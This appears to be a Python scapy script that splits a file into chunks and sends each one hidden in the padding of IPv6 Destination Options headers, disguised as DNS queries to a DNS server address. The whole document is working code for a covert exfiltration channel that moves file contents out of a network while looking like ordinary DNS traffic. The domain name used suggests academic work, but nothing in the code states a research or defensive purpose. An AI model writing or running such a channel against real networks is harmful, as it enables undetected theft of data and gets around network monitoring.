#!/usr/bin/python
import sys
import time
import socket
from scapy.all import *
import getinfo
import fileop
ethertype = b"\x86\xdd" # IPv6
# Src
clientMAC, clientIP = getinfo.src_addrs()
# Dst
dnsMAC, dnsIP = getinfo.dst_addrs()
#whohas = sys.argv[2] # Ask for DNS Record
start = time.time() # Timer
# Process the binary file to send
filename = sys.argv[1]
msglist = fileop.bin_split(filename)
whohas = filename + '.' + str(len(msglist)) + '.ncnu.org'
# Send
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
s.bind((str(conf.iface), 0))
#pkt = IPv6(dst=dnsIP)/IPv6ExtHdrDestOpt(options=PadN(optdata=filename))/UDP(sport=53, dport=53)/DNS(id=0, qd=DNSQR(qname=whohas, qtype="A"))
#s.sendall(dnsMAC + clientMAC + ethertype + bytes(pkt))
for i in range(len(msglist)):
    myid = i
    pkt = IPv6(dst=dnsIP)/IPv6ExtHdrDestOpt(options=PadN(optdata=msglist[i]))/UDP(sport=53, dport=53)/DNS(id=myid, qd=DNSQR(qname=whohas, qtype="A"))
    s.sendall(dnsMAC + clientMAC + ethertype + bytes(pkt))
stop = time.time() # Timer
print("Finished sending {} packets.".format(len(msglist)))
print("Time: {:.2f} seconds.".format(stop - start))
s.close()
